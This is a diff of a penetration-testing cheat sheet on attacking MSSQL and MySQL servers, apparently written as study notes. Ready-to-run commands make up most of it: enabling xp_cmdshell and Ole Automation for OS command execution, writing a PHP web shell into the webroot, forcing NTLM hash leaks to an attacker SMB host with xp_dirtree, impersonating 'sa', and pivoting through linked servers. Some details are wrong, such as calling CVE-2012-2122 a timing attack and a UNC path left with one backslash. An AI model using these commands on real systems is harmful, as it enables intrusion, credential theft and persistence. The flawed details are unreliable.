@@ -1,227 +1,231 @@
-# SQL Database Attacks (MSSQL & MySQL)
+## Initial Enumeration
 
-Databases are high-value targets because they store **sensitive data** (PII, credentials, payment info) and often run with **high privileges** that can be leveraged for lateral movement or privilege escalation.
+Symptom: Identifying database services on standard or non-standard ports. MSSQL defaults to **TCP/1433** and **UDP/1434**, or **TCP/2433** when hidden; MySQL defaults to **TCP/3306**.
 
-## 1. Initial Enumeration
-
-Identify the database service, version, and potential misconfigurations by scanning default ports.
-
-|Service|Default Port(s)|Notes|
-|:--|:--|:--|
-|**MSSQL**|`TCP/1433`, `UDP/1434`|Uses `TCP/2433` if in "hidden" mode.|
-|**MySQL**|`TCP/3306`|Standard port for MySQL/MariaDB.|
-
-### Nmap Service Enumeration
-
-Use Nmap to grab banners and run default scripts to identify the specific version and hostname.
+Banner grabbing and script-based enumeration:
 
 ```
 nmap -Pn -sV -sC -p<PORT> <TARGET_IP>
 ```
 
-## 2. Authentication & Connection
+**Dangerous / misconfigured settings**
 
-Accessing the database depends on the authentication mode implemented and the tools available on your attack platform.
+- MSSQL running in **hidden mode** on **TCP/2433**.
+- **Anonymous access** enabled or users configured with **no password**.
 
-### Authentication Modes
+## Connecting to SQL Services
 
-|Database|Mode|Description|
-|:--|:--|:--|
-|**MSSQL**|**Windows Authentication**|Integrated with Windows/AD. Trusted accounts log in without additional credentials.|
-|**MSSQL**|**Mixed Mode**|Supports both Windows accounts and SQL-specific username/password pairs.|
-|**MySQL**|**Plugin-based**|Supports password-based or Windows authentication via plugins.|
+Symptom: Valid credentials obtained for a target database service.
 
-### Connection Commands
-
-Use these commands once credentials or access methods are identified.
-
-#### MySQL Connection
+Connect to MySQL/MariaDB:
 
 ```
 mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
 ```
 
-#### MSSQL Connection (Linux)
-
-Use **sqsh** for a command-line interface or **mssqlclient.py** from the Impacket suite.
-
-```
-# Standard SQL Authentication
-sqsh -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -h
-
-# Windows Authentication (using domain or hostname)
-sqsh -S <TARGET_IP> -U <DOMAIN>\<USERNAME> -P '<PASSWORD>' -h
-
-# Impacket client
-mssqlclient.py -p <PORT> <USERNAME>@<TARGET_IP>
-```
-
-#### MSSQL Connection (Windows)
+Connect to MSSQL via sqlcmd with adjusted output width:
 
 ```
 sqlcmd -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -y 30 -Y 30
 ```
 
-_Note: `-y` and `-Y` parameters improve output formatting but may impact performance._
+Connect to MSSQL via sqsh with Windows Authentication:
 
-### Authentication Bypass (MySQL 5.6.x)
+```
+sqsh -S <TARGET_IP> -U <DOMAIN>\<USERNAME> -P '<PASSWORD>' -h
+```
 
-In specific older versions (CVE-2012-2122), a **timing attack** allows authentication bypass by repeatedly attempting login with an incorrect password, as the server takes longer to respond to incorrect attempts than to a valid one.
+**Tool comparison**
 
-## 3. Database Navigation & Information Gathering
+- sqlcmd -> `sqlcmd -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>` -> native Windows CLI; use `-y/-Y` for output formatting.
+- sqsh -> `sqsh -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>` -> Linux-based; use `-h` to disable headers for clean output.
 
-Once connected, enumerate the structure to find sensitive tables like users, passwords, or configurations.
+**Gotchas**
 
-|Action|MySQL Syntax|MSSQL Syntax|
-|:--|:--|:--|
-|**List Databases**|`SHOW DATABASES;`|`SELECT name FROM master.dbo.sysdatabases; GO`|
-|**Select Database**|`USE <DATABASE_NAME>;`|`USE <DATABASE_NAME>; GO`|
-|**List Tables**|`SHOW TABLES;`|`SELECT table_name FROM <DATABASE_NAME>.INFORMATION_SCHEMA.TABLES; GO`|
-|**Dump Table Data**|`SELECT * FROM <TABLE_NAME>;`|`SELECT * FROM <TABLE_NAME>; GO`|
+- **Authentication failure** occurs if the domain/hostname is omitted when attempting **Windows Authentication**; it defaults to SQL Authentication.
 
-_Note: MSSQL commands via `sqlcmd` require the `GO` statement to execute._
+## MySQL Authentication Bypass
 
-## 4. Operational Workflows: OS Interaction
+Symptom: Targeting MySQL 5.6.x or similar where a **timing attack** vulnerability (CVE-2012-2122) exists.
 
-### Command Execution (MSSQL)
+Bypass login by repeatedly sending an incorrect password until the server fails to validate correctly:
 
-If the user has sufficient privileges, `xp_cmdshell` can be used to execute system commands.
+```
+for i in {1..1000}; do mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP> -e "status" 2>/dev/null && break; done
+```
 
-1. **Enable advanced options:**
-    
-    ```
-    EXECUTE sp_configure 'show advanced options', 1;
-    RECONFIGURE;
-    GO
-    ```
-    
-2. **Enable xp_cmdshell:**
-    
-    ```
-    EXECUTE sp_configure 'xp_cmdshell', 1;
-    RECONFIGURE;
-    GO
-    ```
-    
-3. **Execute command:**
-    
-    ```
-    xp_cmdshell '<COMMAND>';
-    GO
-    ```
-    
+**Gotchas**
 
-### File Operations
+- **Bypass failure** if the specific race condition/timing vulnerability is not present in the target version.
 
-Used to read sensitive configuration files or write web shells for persistent OS access.
+## Database and Table Enumeration
 
-#### Reading Files
+Symptom: Initial access established; need to locate **PII**, **credentials**, or **configuration** data.
 
-- **MSSQL:** Uses `OPENROWSET` to read any file the service account has access to.
-    
-    ```
-    SELECT * FROM OPENROWSET(BULK N'<FILE_PATH>', SINGLE_CLOB) AS Contents;
-    GO
-    ```
-    
-- **MySQL:** Uses `LOAD_FILE()` if `secure_file_priv` is not restrictive.
-    
-    ```
-    SELECT LOAD_FILE('<FILE_PATH>');
-    ```
-    
+List MySQL databases:
 
-#### Writing Files
+```
+SHOW DATABASES;
+```
 
-- **MySQL:** Use `SELECT INTO OUTFILE` to write a web shell to a web-accessible directory.
-    
-    ```
-    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-    ```
-    
-    _Requirement: The `secure_file_priv` variable must be empty and the user must have `FILE` privileges._
-- **MSSQL:** Requires **Ole Automation Procedures** to be enabled.
-    
-    ```
-    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
-    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<FILE_PATH>', 8, 1;
-    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<CONTENT>';
-    ```
-    
+List MSSQL databases:
 
-## 5. Privilege Escalation & Lateral Movement
+```
+SELECT name FROM master.dbo.sysdatabases;
+GO
+```
 
-### NTLM Hash Stealing (MSSQL)
+List MySQL tables in a specific database:
 
-Force the MSSQL service account to authenticate to your controlled SMB server to capture its **NTLMv2 hash**.
+```
+USE <SERVICE_NAME>;
+SHOW TABLES;
+```
 
-1. **Start capture tool on attack machine:**
-    
-    ```
-    sudo responder -I <INTERFACE>
-    # OR
-    sudo impacket-smbserver share ./ -smb2support
-    ```
-    
-2. **Trigger SMB connection from MSSQL:**
-    
-    ```
-    EXEC master..xp_dirtree '\\<ATTACK_IP>\share';
-    GO
-    ```
-    
+List MSSQL tables using INFORMATION_SCHEMA:
 
-### User Impersonation (MSSQL)
+```
+SELECT table_name FROM <SERVICE_NAME>.INFORMATION_SCHEMA.TABLES;
+GO
+```
 
-Check for the `IMPERSONATE` permission to take on the identity of a more privileged user like `sa`.
+**Gotchas**
 
-1. **Identify impersonation targets:**
-    
-    ```
-    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
-    GO
-    ```
-    
-2. **Impersonate user:**
-    
-    ```
-    EXECUTE AS LOGIN = '<USERNAME>';
-    GO
-    ```
-    
-3. **Verify new privileges:**
-    
-    ```
-    SELECT IS_SRVROLEMEMBER('sysadmin');
-    GO
-    ```
-    
+- **Permission denied** error occurs when attempting to list or connect to a database without sufficient user privileges.
 
-### Linked Servers (MSSQL)
+## RCE via MSSQL xp_cmdshell
 
-Linked servers allow executing commands on **remote database instances**. If the link is configured with `sysadmin` credentials, it facilitates lateral movement.
+Symptom: **sysadmin** privileges (or equivalent) held on MSSQL; need OS-level command execution.
 
-1. **Identify linked servers:**
-    
-    ```
-    SELECT srvname, isremote FROM sysservers;
-    GO
-    ```
-    
-2. **Execute commands on remote server:**
-    
-    ```
-    EXECUTE('<QUERY>') AT [<REMOTE_SERVER_NAME>];
-    GO
-    ```
-    
+Enable advanced options and xp_cmdshell:
 
-## Dangerous Misconfigurations
+```
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+GO
+```
 
-|Setting/Feature|Risk|
-|:--|:--|
-|**Anonymous Access**|Allows access to the service without any credentials.|
-|**xp_cmdshell Enabled**|Allows direct OS command execution from SQL queries.|
-|**Empty `secure_file_priv`**|(MySQL) Allows arbitrary file read/write across the filesystem.|
-|**IMPERSONATE Permission**|Allows non-admin users to escalate to `sa` privileges.|
-|**Linked Server `sysadmin` Link**|Allows lateral movement to other servers with full administrative control.|
+Execute OS commands:
+
+```
+xp_cmdshell '<COMMAND>';
+GO
+```
+
+> ⚠️ Gap: Command execution will fail if the MSSQL service account lacks permissions to execute `cmd.exe` or if EDR blocks the spawned process.
+
+## RCE via MySQL File Write
+
+Symptom: MySQL **FILE** privilege held and **secure_file_priv** is disabled/empty; targeting a web server directory.
+
+Check secure_file_priv status:
+
+```
+show variables like "secure_file_priv";
+```
+
+Write a PHP webshell to the webroot:
+
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '<FILE_PATH>';
+```
+
+**Dangerous / misconfigured settings**
+
+- **secure_file_priv** set to empty, allowing unrestricted read/write access via SQL.
+
+## RCE via MSSQL Ole Automation
+
+Symptom: Admin privileges held on MSSQL; **xp_cmdshell** is restricted or monitored, but file write is possible.
+
+Enable Ole Automation Procedures:
+
+```
+sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE;
+GO
+```
+
+Write a file to the filesystem:
+
+```
+DECLARE @OLE INT;
+DECLARE @FileID INT;
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<FILE_PATH>', 8, 1;
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<DATA>';
+EXECUTE sp_OADestroy @FileID;
+EXECUTE sp_OADestroy @OLE;
+GO
+```
+
+## MSSQL Hash Stealing
+
+Symptom: Need to capture the MSSQL **service account hash** for offline cracking or NTLM relay.
+
+Trigger NTLM authentication via xp_dirtree:
+
+```
+EXEC master..xp_dirtree '\<ATTACK_IP>\<SHARE_NAME>';
+GO
+```
+
+Trigger NTLM authentication via xp_subdirs:
+
+```
+EXEC master..xp_subdirs '\<ATTACK_IP>\<SHARE_NAME>';
+GO
+```
+
+**Tool comparison**
+
+- Responder -> `sudo responder -I <INTERFACE>` -> use for capturing and analyzing hashes.
+- impacket-smbserver -> `sudo impacket-smbserver <SHARE_NAME> ./ -smb2support` -> use for capturing hashes when a simple SMB listener is sufficient.
+
+## MSSQL Context Impersonation
+
+Symptom: Current user is not a **sysadmin**, but has **IMPERSONATE** permissions on a high-privileged user.
+
+Identify users available for impersonation:
+
+```
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+GO
+```
+
+Impersonate the 'sa' user:
+
+```
+EXECUTE AS LOGIN = 'sa';
+GO
+```
+
+**Edge cases**
+
+- Use `USE master` before impersonating; the target user may lack access to the current database, causing an **authentication error**.
+
+## MSSQL Linked Servers
+
+Symptom: Current MSSQL instance has **linked servers** configured, potentially allowing lateral movement.
+
+Identify linked/remote servers:
+
+```
+SELECT srvname, isremote FROM sysservers;
+GO
+```
+
+Execute commands on the linked server as **sysadmin** (if configured with high-priv credentials):
+
+```
+EXECUTE('<COMMAND>') AT [<PIVOT_IP>\<SERVICE_NAME>];
+GO
+```
+
+**Gotchas**
+
+- **Syntax error** occurs if single quotes are not escaped using double single quotes (`''`) when passing commands through the `EXECUTE` statement.
